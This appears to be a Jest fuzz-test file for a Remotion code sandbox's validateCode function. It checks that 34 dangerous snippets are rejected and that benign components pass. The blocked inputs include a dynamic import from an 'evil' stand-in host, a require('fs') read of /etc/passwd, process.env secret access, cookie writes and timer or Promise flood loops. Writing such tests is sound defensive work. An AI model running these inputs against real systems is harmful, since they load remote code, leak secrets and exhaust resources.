/**
 * @jest-environment jsdom
 *
 * TM-85 — Sandbox fuzz suite.
 *
 * Extends the TM-48 evaluator-fuzz with the categories listed in the TM-85
 * spec:
 *   - eval / Function / new Function
 *   - Reflect / Proxy
 *   - atob / btoa / Buffer
 *   - process / global / globalThis
 *   - import / require (runtime)
 *   - WebAssembly / Worker / ServiceWorker
 *   - setTimeout self-recursion (0-day DoS)
 *   - infinite Promise chain (0-day microtask flood)
 *
 * Acceptance: every malicious case is blocked by `validateCode` BEFORE it
 * ever reaches the evaluator, AND the structured error message is
 * non-empty + human-readable (used by the upstream UI for the friendly
 * "이 코드는 안전 검사에 막혔어요" toast).
 */
import { validateCode } from '@/lib/remotion/sandbox';

interface FuzzCase {
  n: number;
  label: string;
  code: string;
  /** Substring expected in `errors` joined output. */
  match: RegExp;
}

const CASES: FuzzCase[] = [
  // --- eval family ---
  { n: 1, label: 'eval direct', code: `eval('1+1')`, match: /eval/ },
  { n: 2, label: 'Function constructor', code: `Function('return 1')()`, match: /Function/ },
  { n: 3, label: 'new Function', code: `new Function('a','b','return a+b')`, match: /Function/ },
  { n: 4, label: 'eval via space', code: `eval ('x')`, match: /eval/ },

  // --- Reflect / Proxy ---
  { n: 5, label: 'Reflect.get', code: `Reflect.get(obj, 'x')`, match: /Reflect/ },
  { n: 6, label: 'Reflect.construct', code: `Reflect.construct(Date, [])`, match: /Reflect/ },
  { n: 7, label: 'new Proxy', code: `new Proxy({}, {})`, match: /Proxy/ },
  { n: 8, label: 'Proxy.revocable', code: `Proxy.revocable({}, {})`, match: /Proxy/ },

  // --- atob / btoa / Buffer ---
  { n: 9, label: 'atob payload', code: `atob('ZXZpbA==')`, match: /atob/ },
  { n: 10, label: 'btoa exfil', code: `btoa('secret')`, match: /btoa/ },
  { n: 11, label: 'Buffer.from', code: `Buffer.from('aGk=', 'base64')`, match: /Buffer/ },
  { n: 12, label: 'eval(atob(...))', code: `eval(atob('YWxlcnQoMSk='))`, match: /eval|atob/ },

  // --- process / global / globalThis ---
  { n: 13, label: 'process.env', code: `process.env.SECRET`, match: /process/ },
  { n: 14, label: 'globalThis', code: `globalThis.fetch('/x')`, match: /globalThis/ },
  { n: 15, label: 'global node', code: `global.process.exit(1)`, match: /global|process/ },

  // --- import / require ---
  { n: 16, label: 'dynamic import', code: `import('https://evil/x.js')`, match: /import/ },
  { n: 17, label: 'require fs', code: `require('fs').readFileSync('/etc/passwd')`, match: /require/ },
  { n: 18, label: 'import.meta', code: `console.log(import.meta.url)`, match: /import\.meta/ },

  // --- WebAssembly / Worker ---
  { n: 19, label: 'WebAssembly.instantiate', code: `WebAssembly.instantiate(bytes)`, match: /WebAssembly/ },
  { n: 20, label: 'new Worker', code: `new Worker('w.js')`, match: /Worker/ },
  { n: 21, label: 'new SharedWorker', code: `new SharedWorker('w.js')`, match: /Worker/ },
  { n: 22, label: 'new ServiceWorker', code: `new ServiceWorker('w.js')`, match: /ServiceWorker/ },

  // --- 0-day: setTimeout self-recursion ---
  {
    n: 23,
    label: 'setTimeout direct',
    code: `setTimeout(() => {}, 0)`,
    match: /setTimeout/,
  },
  {
    n: 24,
    label: 'setTimeout recursive',
    code: `function loop(){ setTimeout(loop, 0); } loop();`,
    match: /setTimeout/,
  },
  {
    n: 25,
    label: 'setInterval flood',
    code: `setInterval(() => 1, 0)`,
    match: /setInterval/,
  },
  {
    n: 26,
    label: 'requestAnimationFrame loop',
    code: `function f(){ requestAnimationFrame(f); } f();`,
    match: /requestAnimationFrame/,
  },
  {
    n: 27,
    label: 'queueMicrotask flood',
    code: `function f(){ queueMicrotask(f); } f();`,
    match: /queueMicrotask/,
  },

  // --- 0-day: infinite Promise chain ---
  {
    n: 28,
    label: 'Promise chain self-recurse (function decl)',
    code: `function loop(){ return Promise.resolve().then(loop); }\nloop();`,
    match: /recursive Promise chain/,
  },
  {
    n: 29,
    label: 'Promise chain self-recurse (arrow expr)',
    code: `const tick = () => Promise.resolve().then(tick);\ntick();`,
    match: /recursive Promise chain/,
  },
  {
    n: 30,
    label: 'Promise chain self-recurse (arrow block)',
    code: `const spin = () => {\n  return Promise.resolve().then(spin);\n};\nspin();`,
    match: /recursive Promise chain/,
  },

  // --- legacy regressions still blocked ---
  { n: 31, label: 'for(;;)', code: `for(;;){ }`, match: /for\(;;\)/ },
  { n: 32, label: 'while(true)', code: `while(true){ }`, match: /while\(true\)/ },
  { n: 33, label: 'document.cookie', code: `document.cookie = 'x=1'`, match: /cookie/ },
  { n: 34, label: 'fetch', code: `fetch('/api')`, match: /fetch/ },
];

describe('TM-85 sandbox fuzz', () => {
  it.each(CASES)('#$n blocks $label', ({ code, match }) => {
    const result = validateCode(code);
    expect(result.valid).toBe(false);
    expect(result.errors.length).toBeGreaterThan(0);
    expect(result.errors.join(' | ')).toMatch(match);
    // Friendly user message contract: error labels are short, human-readable,
    // and never contain a stack trace.
    for (const err of result.errors) {
      expect(err.length).toBeLessThan(120);
      expect(err).not.toMatch(/\bat\s+\w+.*:\d+:\d+/); // stack frame
    }
  });

  // --- benign baselines: must NOT be blocked ---
  const BENIGN: Array<{ label: string; code: string }> = [
    {
      label: 'plain Remotion component',
      code: `
        const PARAMS = { color: '#fff' };
        const Component = () => <AbsoluteFill style={{ backgroundColor: PARAMS.color }} />;
      `,
    },
    {
      label: 'uses interpolate / spring',
      code: `
        const Comp = () => {
          const frame = useCurrentFrame();
          const o = interpolate(frame, [0, 30], [0, 1]);
          return <AbsoluteFill style={{ opacity: o }} />;
        };
      `,
    },
    {
      label: 'non-recursive Promise.then is fine',
      code: `
        const data = Promise.resolve(1).then(x => x + 1);
      `,
    },
    {
      label: 'identifier containing "global" substring is allowed',
      code: `
        const useGlobalsOfMine = () => 1;
        const myGlobalsHere = 2;
      `,
    },
  ];

  it.each(BENIGN)('allows benign: $label', ({ code }) => {
    const result = validateCode(code);
    expect(result).toEqual({ valid: true, errors: [] });
  });
});
